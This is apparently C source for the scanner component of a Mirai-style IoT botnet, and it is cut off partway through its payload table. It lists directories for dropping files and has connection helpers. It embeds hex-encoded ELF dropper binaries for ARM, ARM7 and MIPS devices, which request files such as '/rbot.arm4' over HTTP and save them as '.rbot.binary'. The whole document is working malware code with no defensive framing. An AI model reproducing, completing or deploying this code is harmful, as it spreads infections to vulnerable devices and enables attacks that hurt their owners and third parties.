#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/types.h>
#include <time.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>
#include <string.h>
#include <linux/ip.h>
#include <linux/tcp.h>

#include "includes.h"
#include "scanner.h"
#include "table.h"
#include "rand.h"
#include "util.h"
#include "checksum.h"
#include "resolv.h"

int rsck, rsck_out, auth_table_len = 0;
char scanner_rawpkt[sizeof (struct iphdr) + sizeof (struct tcphdr)] = {0};
struct scanner_auth *auth_table = NULL;
uint16_t auth_table_max_weight = 0;
uint32_t fake_time = 0;

char *tmp_dirs[] = {"/tmp/", "/var/", "/dev/", "/mnt/", "/var/run/", "/var/tmp/", "/",
                    "/dev/netslink/", "/dev/shm/", "/bin/", "/etc/", "/boot/", "/usr/", "/var/Sofia", "."};

int recv_strip_null(int sock, void *buf, int len, int flags)
{
    int ret = recv(sock, buf, len, flags);

    if (ret > 0)
    {
        int i = 0;

        for(i = 0; i < ret; i++)
        {
            if (((char *)buf)[i] == 0x00)
            {
                ((char *)buf)[i] = 'A';
            }
        }
    }

    return ret;
}

void fdclose(struct scanner_connection *conn, int finished)
{
	memset(conn->arch, 0, sizeof(conn->arch));
	conn->info.has_arch = 0;
	conn->dropper_index = 0;
	conn->tries = 0;
	conn->info.upload_method = -1;
    conn->echo = 0;
    conn->oppsitearm = 0;

    if (conn->fd != -1)
	   close(conn->fd);

    conn->fd = -1;
    conn->state = SC_CLOSED;
}

int szprintf(char *string, const char *format, ...)
{
	va_list arg_ptr;
	va_start(arg_ptr, format);

	vsprintf(string, format, arg_ptr);

	va_end(arg_ptr);
}

int fdsend(int fd, const char *fmt, ...)
{
    char buffer[5024 + 2];
    int len = 0;
	va_list args;

    va_start(args, fmt);
    len = vsprintf(buffer, fmt, args);
    va_end(args);

    if(send(fd, buffer, len, MSG_NOSIGNAL) != len)
        return FALSE;

	send(fd, "\r\n", 2, MSG_NOSIGNAL);

	#ifdef DEBUG
		//printf("[scanner] FD%d sent '%s' + newline\r\n", fd, buffer);
	#endif

    return TRUE;
}



struct payload payloads[NUM_OF_PAYLOADS] =
{
    // arm
    {ENDIAN_LITTLE, EM_ARM, "\x7f\x45\x4c\x46\x01\x01\x01\x61\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x28\x00\x01\x00\x00\x00\xdc\x82\x00\x00\x34\x00\x00\x00\x70\x03\x00\x00\x02\x02\x00\x00\x34\x00\x20\x00\x02\x00\x28\x00\x05\x00\x04\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x80\x00\x00\x50\x03\x00\x00\x50\x03\x00\x00\x05\x00\x00\x00\x00\x80\x00\x00\x01\x00\x00\x00\x50\x03\x00\x00\x50\x03\x01\x00\x50\x03\x01\x00\x00\x00\x00\x00\x08\x00\x00\x00\x06\x00\x00\x00\x00\x80\x00\x00\x01\x18\xa0\xe1\xff\x18\x01\xe2\x00\x1c\x81\xe1\xff\x30\x03\xe2\x02\x24\xa0\xe1\x03\x10\x81\xe1\xff\x2c\x02\xe2\x01\x20\x82\xe1\xff\x3c\x02\xe2\xff\x08\x02\xe2\x03\x34\xa0\xe1\x20\x04\xa0\xe1\x22\x0c\x80\xe1\x02\x3c\x83\xe1\x00\x00\x83\xe1\x0e\xf0\xa0\xe1\x00\x10\xa0\xe1\x00\x00\x9f\xe5\x87\x00\x00\xea\x01\x00\x90\x00\x00\x10\xa0\xe1\x00\x00\x9f\xe5\x83\x00\x00\xea\x06\x00\x90\x00\x01\xc0\xa0\xe1\x00\x10\xa0\xe1\x08\x00\x9f\xe5\x02\x30\xa0\xe1\x0c\x20\xa0\xe1\x7c\x00\x00\xea\x05\x00\x90\x00\x04\xe0\x2d\xe5\x0c\xd0\x4d\xe2\x07\x00\x8d\xe8\x03\x10\xa0\xe3\x0d\x20\xa0\xe1\x08\x00\x9f\xe5\x74\x00\x00\xeb\x0c\xd0\x8d\xe2\x00\x80\xbd\xe8\x66\x00\x90\x00\x01\xc0\xa0\xe1\x00\x10\xa0\xe1\x08\x00\x9f\xe5\x02\x30\xa0\xe1\x0c\x20\xa0\xe1\x6b\x00\x00\xea\x04\x00\x90\x00\x01\xc0\xa0\xe1\x00\x10\xa0\xe1\x08\x00\x9f\xe5\x02\x30\xa0\xe1\x0c\x20\xa0\xe1\x64\x00\x00\xea\x03\x00\x90\x00\x04\xe0\x2d\xe5\x0c\xd0\x4d\xe2\x07\x00\x8d\xe8\x01\x10\xa0\xe3\x0d\x20\xa0\xe1\x08\x00\x9f\xe5\x5c\x00\x00\xeb\x0c\xd0\x8d\xe2\x00\x80\xbd\xe8\x66\x00\x90\x00\xf0\x41\x2d\xe9\x40\xe1\x9f\xe5\x94\xd0\x4d\xe2\x00\x00\x00\xea\x01\xe0\x8e\xe2\x00\x60\xde\xe5\x00\x00\x56\xe3\xfb\xff\xff\x1a\x24\xc1\x9f\xe5\xd0\x30\xa0\xe3\x0e\x80\x6c\xe0\x02\x40\xa0\xe3\x50\xc0\xa0\xe3\x6b\x10\xa0\xe3\x85\x20\xa0\xe3\xb0\x00\xa0\xe3\x83\xc0\xcd\xe5\x80\x40\xcd\xe5\x81\x60\xcd\xe5\x82\x60\xcd\xe5\xa9\xff\xff\xeb\xf4\x10\x9f\xe5\x84\x00\x8d\xe5\xf0\x20\x9f\xe5\xf0\x00\x9f\xe5\xbc\xff\xff\xeb\x01\x10\xa0\xe3\x00\x70\xa0\xe1\x06\x20\xa0\xe1\x04\x00\xa0\xe1\xd6\xff\xff\xeb\x01\x00\x70\xe3\x01\x00\x77\x13\x00\x50\xa0\xe1\x01\x00\xa0\x03\xaa\xff\xff\x0b\x05\x00\xa0\xe1\x80\x10\x8d\xe2\x10\x20\xa0\xe3\xb5\xff\xff\xeb\x00\x00\x50\xe3\x00\x00\x60\xb2\xa3\xff\xff\xbb\x17\x40\x88\xe2\x05\x00\xa0\xe1\xa0\x10\x9f\xe5\x04\x20\xa0\xe1\xb7\xff\xff\xeb\x04\x00\x50\xe1\x03\x00\xa0\x13\x9b\xff\xff\x1b\x06\x40\xa0\xe1\x93\x10\x8d\xe2\x01\x20\xa0\xe3\x05\x00\xa0\xe1\xb6\xff\xff\xeb\x01\x00\x50\xe3\x04\x00\xa0\xe3\x93\xff\xff\x1b\x93\x30\xdd\xe5\x04\x44\x83\xe1\x64\x30\x9f\xe5\x03\x00\x54\xe1\xf3\xff\xff\x1a\x0d\x10\xa0\xe1\x80\x20\xa0\xe3\x05\x00\xa0\xe1\xaa\xff\xff\xeb\x00\x20\x50\xe2\x0d\x40\xa0\xe1\x0d\x10\xa0\xe1\x07\x00\xa0\xe1\x01\x00\x00\xda\x9d\xff\xff\xeb\xf4\xff\xff\xea\x05\x00\xa0\xe1\x85\xff\xff\xeb\x07\x00\xa0\xe1\x83\xff\xff\xeb\x05\x00\xa0\xe3\x7d\xff\xff\xeb\x94\xd0\x8d\xe2\xf0\x81\xbd\xe8\x1c\x83\x00\x00\x41\x02\x00\x00\xff\x01\x00\x00\x24\x83\x00\x00\x34\x83\x00\x00\x0a\x0d\x0a\x0d\xa5\xff\xff\xea\x70\x40\x2d\xe9\x10\x40\x8d\xe2\x70\x00\x94\xe8\x71\x00\x90\xef\x01\x0a\x70\xe3\x00\x40\xa0\xe1\x70\x80\xbd\x98\x03\x00\x00\xeb\x00\x30\x64\xe2\x00\x30\x80\xe5\x00\x00\xe0\xe3\x70\x80\xbd\xe8\x00\x00\x9f\xe5\x0e\xf0\xa0\xe1\x50\x03\x01\x00\x61\x72\x6d\x34\x00\x00\x00\x00\x2e\x72\x62\x6f\x74\x2e\x62\x69\x6e\x61\x72\x79\x00\x00\x00\x00\x47\x45\x54\x20\x2f\x72\x62\x6f\x74\x2e\x61\x72\x6d\x34\x20\x48\x54\x54\x50\x2f\x31\x2e\x30\x0d\x0a\x0d\x0a\x00\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2e\x74\x65\x78\x74\x00\x2e\x72\x6f\x64\x61\x74\x61\x00\x2e\x62\x73\x73\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\x74\x80\x00\x00\x74\x00\x00\x00\xa8\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x01\x00\x00\x00\x32\x00\x00\x00\x1c\x83\x00\x00\x1c\x03\x00\x00\x34\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00\x19\x00\x00\x00\x08\x00\x00\x00\x03\x00\x00\x00\x50\x03\x01\x00\x50\x03\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x50\x03\x00\x00\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00", 1080},
    // arm7
    {ENDIAN_LITTLE, EM_ARM7, "\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x28\x00\x01\x00\x00\x00\x6c\x83\x00\x00\x34\x00\x00\x00\x48\x04\x00\x00\x02\x00\x00\x04\x34\x00\x20\x00\x04\x00\x28\x00\x06\x00\x05\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x80\x00\x00\x14\x04\x00\x00\x14\x04\x00\x00\x05\x00\x00\x00\x00\x80\x00\x00\x01\x00\x00\x00\x14\x04\x00\x00\x14\x04\x01\x00\x14\x04\x01\x00\x10\x00\x00\x00\x10\x00\x00\x00\x06\x00\x00\x00\x00\x80\x00\x00\x07\x00\x00\x00\x14\x04\x00\x00\x14\x04\x01\x00\x14\x04\x01\x00\x00\x00\x00\x00\x08\x00\x00\x00\x04\x00\x00\x00\x04\x00\x00\x00\x51\xe5\x74\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x38\x83\xe1\x00\x3c\x83\xe1\x02\x34\x83\xe1\x03\x0c\xa0\xe1\x02\x08\x80\xe1\xff\x28\x03\xe2\x22\x04\x80\xe1\x23\x0c\x80\xe1\x1e\xff\x2f\xe1\x04\xe0\x2d\xe5\x00\x10\xa0\xe1\x04\xd0\x4d\xe2\x01\x00\xa0\xe3\x9d\x00\x00\xeb\x04\xd0\x8d\xe2\x04\xe0\x9d\xe4\x1e\xff\x2f\xe1\x04\xe0\x2d\xe5\x00\x10\xa0\xe1\x04\xd0\x4d\xe2\x06\x00\xa0\xe3\x95\x00\x00\xeb\x04\xd0\x8d\xe2\x04\xe0\x9d\xe4\x1e\xff\x2f\xe1\x04\xe0\x2d\xe5\x01\xc0\xa0\xe1\x02\x30\xa0\xe1\x00\x10\xa0\xe1\x04\xd0\x4d\xe2\x0c\x20\xa0\xe1\x05\x00\xa0\xe3\x8a\x00\x00\xeb\x04\xd0\x8d\xe2\x04\xe0\x9d\xe4\x1e\xff\x2f\xe1\x04\xe0\x2d\xe5\x01\xc0\xa0\xe1\x02\x30\xa0\xe1\x00\x10\xa0\xe1\x04\xd0\x4d\xe2\x0c\x20\xa0\xe1\x0c\x00\x9f\xe5\x7f\x00\x00\xeb\x04\xd0\x8d\xe2\x04\xe0\x9d\xe4\x1e\xff\x2f\xe1\x1b\x01\x00\x00\x04\xe0\x2d\xe5\x01\xc0\xa0\xe1\x02\x30\xa0\xe1\x00\x10\xa0\xe1\x04\xd0\x4d\xe2\x0c\x20\xa0\xe1\x04\x00\xa0\xe3\x73\x00\x00\xeb\x04\xd0\x8d\xe2\x04\xe0\x9d\xe4\x1e\xff\x2f\xe1\x04\xe0\x2d\xe5\x01\xc0\xa0\xe1\x02\x30\xa0\xe1\x00\x10\xa0\xe1\x04\xd0\x4d\xe2\x0c\x20\xa0\xe1\x03\x00\xa0\xe3\x68\x00\x00\xeb\x04\xd0\x8d\xe2\x04\xe0\x9d\xe4\x1e\xff\x2f\xe1\x04\xe0\x2d\xe5\x01\xc0\xa0\xe1\x02\x30\xa0\xe1\x00\x10\xa0\xe1\x04\xd0\x4d\xe2\x0c\x20\xa0\xe1\x0c\x00\x9f\xe5\x5d\x00\x00\xeb\x04\xd0\x8d\xe2\x04\xe0\x9d\xe4\x1e\xff\x2f\xe1\x19\x01\x00\x00\xf0\x41\x2d\xe9\x40\x31\x9f\xe5\x98\xd0\x4d\xe2\x00\x40\xa0\xe3\x00\x00\x00\xea\x01\x40\x84\xe2\x01\x60\x53\xe5\x00\x00\x56\xe3\x01\x30\x83\xe2\xfa\xff\xff\x1a\x02\xc0\xa0\xe3\xd0\x30\xa0\xe3\x6b\x10\xa0\xe3\x85\x20\xa0\xe3\xb4\xc8\xcd\xe1\xb0\x00\xa0\xe3\x05\xca\xa0\xe3\xb6\xc8\xcd\xe1\x9a\xff\xff\xeb\xfc\x10\x9f\xe5\x88\x00\x8d\xe5\xf8\x20\x9f\xe5\xf8\x00\x9f\xe5\xae\xff\xff\xeb\x01\x10\xa0\xe3\x00\x70\xa0\xe1\x06\x20\xa0\xe1\x02\x00\xa0\xe3\xd6\xff\xff\xeb\x01\x00\x70\xe3\x01\x00\x77\x13\x00\x50\xa0\xe1\x01\x00\xa0\x03\x94\xff\xff\x0b\x05\x00\xa0\xe1\x84\x10\x8d\xe2\x10\x20\xa0\xe3\xab\xff\xff\xeb\x00\x00\x50\xe3\x00\x00\x60\xb2\x8d\xff\xff\xbb\x17\x40\x84\xe2\x05\x00\xa0\xe1\xa8\x10\x9f\xe5\x04\x20\xa0\xe1\xaf\xff\xff\xeb\x04\x00\x50\xe1\x03\x00\xa0\x13\x85\xff\xff\x1b\x94\x80\x9f\xe5\x06\x40\xa0\xe1\x97\x60\x8d\xe2\x06\x10\xa0\xe1\x01\x20\xa0\xe3\x05\x00\xa0\xe1\xb0\xff\xff\xeb\x01\x00\x50\xe3\x04\x00\xa0\xe3\x7b\xff\xff\x1b\x97\x30\xdd\xe5\x04\x44\x83\xe1\x08\x00\x54\xe1\xf4\xff\xff\x1a\x04\x40\x8d\xe2\x04\x10\xa0\xe1\x80\x20\xa0\xe3\x05\x00\xa0\xe1\xa4\xff\xff\xeb\x00\x20\x50\xe2\x04\x10\xa0\xe1\x07\x00\xa0\xe1\x01\x00\x00\xda\x94\xff\xff\xeb\xf5\xff\xff\xea\x05\x00\xa0\xe1\x72\xff\xff\xeb\x07\x00\xa0\xe1\x70\xff\xff\xeb\x05\x00\xa0\xe3\x66\xff\xff\xeb\x98\xd0\x8d\xe2\xf0\x41\xbd\xe8\x1e\xff\x2f\xe1\xe1\x83\x00\x00\x41\x02\x00\x00\xff\x01\x00\x00\xe8\x83\x00\x00\xf8\x83\x00\x00\x0a\x0d\x0a\x0d\xa5\xff\xff\xea\x0d\xc0\xa0\xe1\xf0\x00\x2d\xe9\x00\x70\xa0\xe1\x01\x00\xa0\xe1\x02\x10\xa0\xe1\x03\x20\xa0\xe1\x78\x00\x9c\xe8\x00\x00\x00\xef\xf0\x00\xbd\xe8\x01\x0a\x70\xe3\x0e\xf0\xa0\x31\xff\xff\xff\xea\x04\xe0\x2d\xe5\x1c\x20\x9f\xe5\x00\x30\xa0\xe1\x02\x20\x9f\xe7\x06\x00\x00\xeb\x00\x30\x63\xe2\x02\x30\x80\xe7\x00\x00\xe0\xe3\x04\xe0\x9d\xe4\x1e\xff\x2f\xe1\x6c\x80\x00\x00\x00\x00\x00\x00\x0f\x0a\xe0\xe3\x1f\xf0\x40\xe2\x00\x00\xa0\xe1\x00\x00\xa0\xe1\x61\x72\x6d\x37\x00\x00\x00\x00\x2e\x72\x62\x6f\x74\x2e\x62\x69\x6e\x61\x72\x79\x00\x00\x00\x00\x47\x45\x54\x20\x2f\x72\x62\x6f\x74\x2e\x61\x72\x6d\x37\x20\x48\x54\x54\x50\x2f\x31\x2e\x30\x0d\x0a\x0d\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2e\x74\x65\x78\x74\x00\x2e\x72\x6f\x64\x61\x74\x61\x00\x2e\x74\x62\x73\x73\x00\x2e\x67\x6f\x74\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\xc0\x80\x00\x00\xc0\x00\x00\x00\x20\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x01\x00\x00\x00\x32\x00\x00\x00\xe0\x83\x00\x00\xe0\x03\x00\x00\x34\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00\x19\x00\x00\x00\x08\x00\x00\x00\x03\x04\x00\x00\x14\x04\x01\x00\x14\x04\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x1f\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x14\x04\x01\x00\x14\x04\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x24\x04\x00\x00\x24\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00", 1336}, // 10
    // mips
    {ENDIAN_BIG, EM_MIPS, "\x7f\x45\x4c\x46\x01\x02\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x08\x00\x00\x00\x01\x00\x40\x04\x60\x00\x00\x00\x34\x00\x00\x06\x48\x00\x00\x10\x07\x00\x34\x00\x20\x00\x03\x00\x28\x00\x07\x00\x06\x00\x00\x00\x01\x00\x00\x00\x00\x00\x40\x00\x00\x00\x40\x00\x00\x00\x00\x05\xb4\x00\x00\x05\xb4\x00\x00\x00\x05\x00\x01\x00\x00\x00\x00\x00\x01\x00\x00\x05\xc0\x00\x44\x05\xc0\x00\x44\x05\xc0\x00\x00\x00\x54\x00\x00\x00\x70\x00\x00\x00\x06\x00\x01\x00\x00\x64\x74\xe5\x51\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x30\xa5\x00\xff\x00\x05\x2c\x00\x00\x04\x26\x00\x00\x85\x20\x25\x30\xc2\x00\xff\x30\xe7\x00\xff\x00\x87\x20\x25\x00\x02\x12\x00\x03\xe0\x00\x08\x00\x44\x10\x25\x3c\x1c\x00\x05\x27\x9c\x84\xe8\x03\x99\xe0\x21\x8f\x99\x80\x5c\x00\x80\x28\x21\x03\x20\x00\x08\x24\x04\x0f\xa1\x3c\x1c\x00\x05\x27\x9c\x84\xcc\x03\x99\xe0\x21\x8f\x99\x80\x5c\x00\x80\x28\x21\x03\x20\x00\x08\x24\x04\x0f\xa6\x3c\x1c\x00\x05\x27\x9c\x84\xb0\x03\x99\xe0\x21\x00\xa0\x10\x21\x8f\x99\x80\x5c\x00\xc0\x38\x21\x00\x80\x28\x21\x00\x40\x30\x21\x03\x20\x00\x08\x24\x04\x0f\xa5\x3c\x1c\x00\x05\x27\x9c\x84\x88\x03\x99\xe0\x21\x27\xbd\xff\xd0\xaf\xbf\x00\x28\xaf\xbc\x00\x10\x8f\x99\x80\x5c\xaf\xa4\x00\x18\xaf\xa5\x00\x1c\xaf\xa6\x00\x20\x24\x04\x10\x06\x27\xa6\x00\x18\x03\x20\xf8\x09\x24\x05\x00\x03\x8f\xbc\x00\x10\x8f\xbf\x00\x28\x00\x00\x00\x00\x03\xe0\x00\x08\x27\xbd\x00\x30\x3c\x1c\x00\x05\x27\x9c\x84\x3c\x03\x99\xe0\x21\x00\xa0\x10\x21\x8f\x99\x80\x5c\x00\xc0\x38\x21\x00\x80\x28\x21\x00\x40\x30\x21\x03\x20\x00\x08\x24\x04\x0f\xa4\x3c\x1c\x00\x05\x27\x9c\x84\x14\x03\x99\xe0\x21\x00\xa0\x10\x21\x8f\x99\x80\x5c\x00\xc0\x38\x21\x00\x80\x28\x21\x00\x40\x30\x21\x03\x20\x00\x08\x24\x04\x0f\xa3\x3c\x1c\x00\x05\x27\x9c\x83\xec\x03\x99\xe0\x21\x27\xbd\xff\xd0\xaf\xbf\x00\x28\xaf\xbc\x00\x10\x8f\x99\x80\x5c\xaf\xa4\x00\x18\xaf\xa5\x00\x1c\xaf\xa6\x00\x20\x24\x04\x10\x06\x27\xa6\x00\x18\x03\x20\xf8\x09\x24\x05\x00\x01\x8f\xbc\x00\x10\x8f\xbf\x00\x28\x00\x00\x00\x00\x03\xe0\x00\x08\x27\xbd\x00\x30\x3c\x1c\x00\x05\x27\x9c\x83\xa0\x03\x99\xe0\x21\x27\xbd\xff\x40\xaf\xbf\x00\xbc\xaf\xb2\x00\xb8\xaf\xb1\x00\xb4\xaf\xb0\x00\xb0\xaf\xbc\x00\x10\x8f\x82\x80\x18\x00\x00\x00\x00\x24\x50\x05\x80\x82\x02\x00\x00\x00\x00\x00\x00\x14\x40\xff\xfd\x26\x10\x00\x01\x26\x10\xff\xff\x24\x02\x00\x02\xa7\xa2\x00\x1c\x24\x02\x00\x50\xa7\xa2\x00\x1e\x8f\x82\x80\x18\x8f\x99\x80\x4c\x24\x07\x00\xd0\x24\x04\x00\xb0\x24\x05\x00\x6b\x24\x06\x00\x85\x24\x42\x05\x80\x03\x20\xf8\x09\x02\x02\x80\x23\x8f\xbc\x00\x10\x24\x05\x03\x01\x8f\x84\x80\x18\x8f\x99\x80\x60\x24\x84\x05\x88\x24\x06\x01\xff\x03\x20\xf8\x09\xaf\xa2\x00\x20\x8f\xbc\x00\x10\x24\x04\x00\x02\x8f\x99\x80\x50\x24\x05\x00\x02\x00\x00\x30\x21\x03\x20\xf8\x09\x00\x40\x90\x21\x00\x40\x88\x21\x24\x02\xff\xff\x8f\xbc\x00\x10\x12\x22\x00\x03\x00\x00\x00\x00\x16\x42\x00\x07\x00\x00\x00\x00\x8f\x99\x80\x54\x00\x00\x00\x00\x03\x20\xf8\x09\x24\x04\x00\x01\x8f\xbc\x00\x10\x00\x00\x00\x00\x8f\x99\x80\x44\x02\x20\x20\x21\x27\xa5\x00\x1c\x03\x20\xf8\x09\x24\x06\x00\x10\x8f\xbc\x00\x10\x04\x41\x00\x07\x00\x00\x00\x00\x8f\x99\x80\x54\x00\x00\x00\x00\x03\x20\xf8\x09\x00\x02\x20\x23\x8f\xbc\x00\x10\x00\x00\x00\x00\x8f\x85\x80\x18\x8f\x99\x80\x48\x26\x10\x00\x17\x24\xa5\x05\x98\x02\x20\x20\x21\x03\x20\xf8\x09\x02\x00\x30\x21\x8f\xbc\x00\x10\x10\x50\x00\x07\x00\x00\x80\x21\x8f\x99\x80\x54\x00\x00\x00\x00\x03\x20\xf8\x09\x24\x04\x00\x03\x8f\xbc\x00\x10\x00\x00\x80\x21\x8f\x99\x80\x38\x02\x20\x20\x21\x27\xa5\x00\x18\x03\x20\xf8\x09\x24\x06\x00\x01\x8f\xbc\x00\x10\x24\x03\x00\x01\x8f\x99\x80\x54\x10\x43\x00\x04\x24\x04\x00\x04\x03\x20\xf8\x09\x00\x00\x00\x00\x8f\xbc\x00\x10\x83\xa3\x00\x18\x00\x10\x12\x00\x00\x43\x80\x25\x3c\x02\x0d\x0a\x34\x42\x0d\x0a\x16\x02\xff\xed\x00\x00\x00\x00\x8f\x99\x80\x38\x27\xb0\x00\x2c\x02\x20\x20\x21\x02\x00\x28\x21\x03\x20\xf8\x09\x24\x06\x00\x80\x8f\xbc\x00\x10\x02\x00\x28\x21\x8f\x99\x80\x48\x00\x40\x30\x21\x18\x40\x00\x06\x02\x40\x20\x21\x03\x20\xf8\x09\x00\x00\x00\x00\x8f\xbc\x00\x10\x10\x00\xff\xf0\x00\x00\x00\x00\x8f\x99\x80\x58\x00\x00\x00\x00\x03\x20\xf8\x09\x02\x20\x20\x21\x8f\xbc\x00\x10\x00\x00\x00\x00\x8f\x99\x80\x58\x00\x00\x00\x00\x03\x20\xf8\x09\x02\x40\x20\x21\x8f\xbc\x00\x10\x00\x00\x00\x00\x8f\x99\x80\x54\x00\x00\x00\x00\x03\x20\xf8\x09\x24\x04\x00\x05\x8f\xbc\x00\x10\x8f\xbf\x00\xbc\x8f\xb2\x00\xb8\x8f\xb1\x00\xb4\x8f\xb0\x00\xb0\x03\xe0\x00\x08\x27\xbd\x00\xc0\x3c\x1c\x00\x05\x27\x9c\x81\x50\x03\x99\xe0\x21\x03\xe0\x00\x21\x04\x11\x00\x01\x00\x00\x00\x00\x3c\x1c\x00\x05\x27\x9c\x81\x38\x03\x9f\xe0\x21\x00\x00\xf8\x21\x8f\x99\x80\x3c\x00\x00\x00\x00\x03\x20\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x3c\x1c\x00\x05\x27\x9c\x81\x10\x03\x99\xe0\x21\x00\x80\x10\x21\x00\xa0\x20\x21\x00\xc0\x28\x21\x00\xe0\x30\x21\x8f\xa7\x00\x10\x8f\xa8\x00\x14\x8f\xa9\x00\x18\x8f\xaa\x00\x1c\x27\xbd\xff\xe0\xaf\xa8\x00\x10\xaf\xa9\x00\x14\xaf\xaa\x00\x18\xaf\xa2\x00\x1c\x8f\xa2\x00\x1c\x00\x00\x00\x0c\x14\xe0\x00\x03\x27\xbd\x00\x20\x03\xe0\x00\x08\x00\x00\x00\x00\x00\x40\x20\x21\x8f\x99\x80\x40\x00\x00\x00\x00\x03\x20\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x3c\x1c\x00\x05\x27\x9c\x80\xa0\x03\x99\xe0\x21\x27\xbd\xff\xe0\xaf\xbf\x00\x1c\xaf\xb0\x00\x18\xaf\xbc\x00\x10\x8f\x99\x80\x34\x00\x00\x00\x00\x03\x20\xf8\x09\x00\x80\x80\x21\x8f\xbc\x00\x10\xac\x50\x00\x00\x8f\xbf\x00\x1c\x8f\xb0\x00\x18\x24\x02\xff\xff\x03\xe0\x00\x08\x27\xbd\x00\x20\x00\x00\x00\x00\x00\x00\x00\x00\x3c\x1c\x00\x05\x27\x9c\x80\x50\x03\x99\xe0\x21\x8f\x82\x80\x30\x03\xe0\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x6d\x69\x70\x73\x00\x00\x00\x00\x2e\x72\x62\x6f\x74\x2e\x62\x69\x6e\x61\x72\x79\x00\x00\x00\x00\x47\x45\x54\x20\x2f\x72\x62\x6f\x74\x2e\x6d\x69\x70\x73\x20\x48\x54\x54\x50\x2f\x31\x2e\x30\x0d\x0a\x0d\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x44\x06\x20\x00\x40\x05\x60\x00\x40\x01\x9c\x00\x40\x02\x10\x00\x40\x05\x10\x00\x40\x01\x28\x00\x40\x01\x74\x00\x40\x00\xa0\x00\x40\x01\xc4\x00\x40\x00\xc8\x00\x40\x00\xe4\x00\x40\x04\xa0\x00\x40\x01\x00\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2e\x74\x65\x78\x74\x00\x2e\x72\x6f\x64\x61\x74\x61\x00\x2e\x67\x6f\x74\x00\x2e\x62\x73\x73\x00\x2e\x6d\x64\x65\x62\x75\x67\x2e\x61\x62\x69\x33\x32\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x01\x00\x00\x00\x06\x00\x40\x00\xa0\x00\x00\x00\xa0\x00\x00\x04\xe0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x01\x00\x00\x00\x32\x00\x40\x05\x80\x00\x00\x05\x80\x00\x00\x00\x34\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00\x19\x00\x00\x00\x01\x10\x00\x00\x03\x00\x44\x05\xc0\x00\x00\x05\xc0\x00\x00\x00\x54\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x04\x00\x00\x00\x1e\x00\x00\x00\x08\x00\x00\x00\x03\x00\x44\x06\x20\x00\x00\x06\